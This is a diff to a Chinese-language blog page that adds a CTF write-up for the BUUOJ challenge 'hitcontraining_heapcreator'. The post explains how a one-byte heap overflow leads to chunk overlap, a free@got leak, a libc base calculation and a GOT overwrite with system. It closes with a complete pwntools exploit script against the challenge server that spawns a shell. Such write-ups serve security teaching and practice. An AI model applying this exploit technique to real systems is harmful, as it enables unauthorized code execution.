@@ -155,6 +155,102 @@
   
   
    <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/11/BUU%E5%88%B7%E9%A2%98/hitcontraining_heapcreator/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_1.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/07/11/BUU%E5%88%B7%E9%A2%98/hitcontraining_heapcreator/" class="post-title-link" itemprop="url">hitcontraining_heapcreator</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-07-11 23:22:41 / 修改时间：02:13:03" itemprop="dateCreated datePublished" datetime="2024-07-11T23:22:41+08:00">2024-07-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUU%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">BUU刷题</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><em>hitcontraining_heapcreator</em></h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102332737.png" alt="image-20240710233212702"></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>​	一共有<em>create_heap</em>，<em>edit_heap</em>，<em>show_heap</em>，<em>delete_heap</em>四个函数，<em>edit_heap</em>函数中有一个堆溢出漏洞，只可以溢出<code>1</code>个字节。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101814056.png" alt="image-20240710181416024" style="zoom: 80%;" />
+
+<p>​	本题中，每<em>malloc</em>一次会创建一个指针<em>chunk</em>和一个内容<em>chunk</em>（其实就是两个地址空间，分别存储着指向<em>chunk</em>中数据的指针，和<em>chunk</em>的数据），而<em>free</em>一次也就是把这两个地址空间都释放掉了。<em>show_heap</em>和<em>edit_heap</em>函数中打印和修改的内容都是由指针决定的，指针指向什么就打印和修改什么。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="改写-size"><a href="#改写-size" class="headerlink" title="改写_size_"></a>改写_size_</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line"><span class="comment">#往_chunk0_中写入&#x27;/bin/sh\x00&#x27;，后面free(chunk0)的时候其实就是system(&quot;/bin/sh&quot;)</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>​	先创建两个<em>chun</em>，<code>0x18</code>是为了在往<em>chunk0</em>中写内容时，直接覆盖掉<em>chunk1</em>的指针<em>chunk</em>的前<code>8</code>个字节，然后就可以利用溢出的一个字节改写<em>chunk1</em>的指针<em>chunk</em>的<em>size</em>。</p>
+<p>如图，指针<em>chunk</em>的<em>size</em>值已经被改写成<code>0x41</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101923019.png" alt="image-20240710192301972"></p>
+<p>​	此时，<em>chunk1</em>的指针<em>chunk</em>与内容<em>chunk</em>，已经部分重叠（因为是指针<em>chunk</em>的<em>size</em>被改写成<code>0x41</code>，内容<em>chunk</em>的<em>size</em>还是<code>0x21</code>，所以如图</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102116011.png" alt="image-20240710192301977" style="zoom:80%;" />
+
+<h3 id="泄漏-free-addr"><a href="#泄漏-free-addr" class="headerlink" title="泄漏_free_addr_"></a>泄漏_free_addr_</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line"><span class="comment">#指针前面0x30是能存储数据的大小，不能改变</span></span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>delete(1)</code>后我们可以看到<em>fastbins</em>有两个不同大小的<em>fastbin_chunk</em>，如图</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102122798.png" alt="image-20240710212229702"></p>
+<p>​	然后我们再申请<code>0x30</code>的<em>chunk</em>用来存储数据（还有<code>0x10</code>的空间存储<em>prve_size</em>和<em>size</em>），又因为<em>fastbins</em>中正好有<code>0x40</code>的<em>fastbins_chunk</em>，所以<code>0x12c2040</code>及下面<code>0x40</code>的内存空间就成了新<em>chunk</em>的内存<em>chunk</em>，<code>0x12c2060</code>及下面<code>0x20</code>的内存空间就成了新<em>chunk</em>的指针内存。</p>
+<p>​	然后我们把<em>free@got</em>写到内存<em>chunk</em>的<code>0x12c2078</code>地址里，这个地址存储着指针<em>chunk</em>里的指针，所以现在指针就是<em>free@got</em>，而<em>show</em>函数打印出来的数据是该指针指向的内容，也就是<em>free@got</em>指向的内容。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102155262.png" alt="image-20240710215550221"></p>
+<h3 id="覆盖-free-got-表"><a href="#覆盖-free-got-表" class="headerlink" title="覆盖_free@got_表"></a>覆盖_free@got_表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​	同样，<em>edit</em>函数修改<em>chunk</em>内容，也是修改指针<em>chunk</em>的指针指向的区域。得到<em>system</em>的地址后，直接用<em>edit</em>函数修改<em>chunk1</em>的内容即可。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102208262.png" alt="image-20240710220849174"></p>
+<p>最后直接<em>free</em>掉<em>chunk0</em>，便能执行<code>system(&quot;/bin/sh&quot;)</code>，得到<em>shell</em>。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28974</span>)</span><br><span class="line">debug(p,<span class="number">0x400DC4</span>,<span class="number">0x400DB8</span>,<span class="number">0x400DD0</span>,<span class="number">0x400DDC</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<em>flag</em></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102221509.png" alt="image-20240710222113464"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/10/BUU%E5%88%B7%E9%A2%98/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1086,7 +1182,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1099,7 +1195,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
